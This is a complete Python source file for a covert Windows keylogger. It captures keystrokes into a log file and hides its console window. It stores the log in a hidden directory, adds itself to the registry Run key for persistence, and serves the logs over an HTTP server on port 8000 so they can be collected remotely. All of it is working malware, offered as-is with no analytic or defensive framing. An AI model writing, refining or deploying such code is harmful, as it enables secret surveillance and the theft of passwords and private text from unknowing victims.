from pynput import keyboard
import threading
import ctypes
import http.server
import socketserver
import os
import sys
import winreg as reg  


if getattr(sys, 'frozen', False):
    current_dir = os.path.dirname(os.path.abspath(sys.executable))
    file_path = os.path.abspath(sys.executable)
else:
    current_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.abspath(__file__)

log_file = os.path.join(current_dir, "kl.txt")

def add_to_startup(app_name="KL.exe"):

    try:
        if getattr(sys, 'frozen', False):
            cmd = f'"{file_path}"'
        else:
            cmd = f'"{sys.executable}" "{file_path}"'

        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, app_name, 0, reg.REG_SZ, cmd)
        reg.CloseKey(key)
    except Exception:
        pass 

class SilentHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

def hide():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        GWL_EXSTYLE = -20
        WS_EX_TOOLWINDOW = 0x00000080
        SW_HIDE = 0
        
        style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
        ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, style | WS_EX_TOOLWINDOW)
        ctypes.windll.user32.ShowWindow(hwnd, SW_HIDE)

def setup_hidden_dir(dir_name=".system_data"):

    hidden_path = os.path.join(current_dir, dir_name)
    
    try:
        if not os.path.exists(hidden_path):
            os.makedirs(hidden_path)
        
        ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)
        return hidden_path
    except Exception:
        return current_dir 

def run_server():
    os.chdir(current_dir) 
    handler = SilentHandler 
    try:
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer(("0.0.0.0", 8000), handler) as httpd:
            httpd.serve_forever()
    except:
        pass

def write_to_file(word):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(word + "\n")
        if os.path.exists(log_file):
            ctypes.windll.kernel32.SetFileAttributesW(log_file, 2)
    except Exception:
        pass

    
text_buffer = ""

def on_press(key):
    global text_buffer

    try:
        if hasattr(key, 'char') and key.char is not None:
            text_buffer += key.char

        elif key == keyboard.Key.space:
            if text_buffer:
                write_to_file(text_buffer)
                text_buffer = ""

            
        elif key == keyboard.Key.enter:
            if text_buffer:
                write_to_file(text_buffer)
                text_buffer = ""
            write_to_file("[ENTER]")

        elif key == keyboard.Key.backspace:
            if len(text_buffer) > 0:
                text_buffer = text_buffer[:-1]
                
    except Exception:
        pass

if __name__ == "__main__":
    try:

        data_dir = setup_hidden_dir(".system_cache")
        log_file = os.path.join(data_dir, "kl.txt")
        current_dir = data_dir 
        
        add_to_startup()
        hide()



        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    except KeyboardInterrupt:
        sys.exit(0)

    except SystemExit:
        pass

    except Exception:
        sys.exit(0)
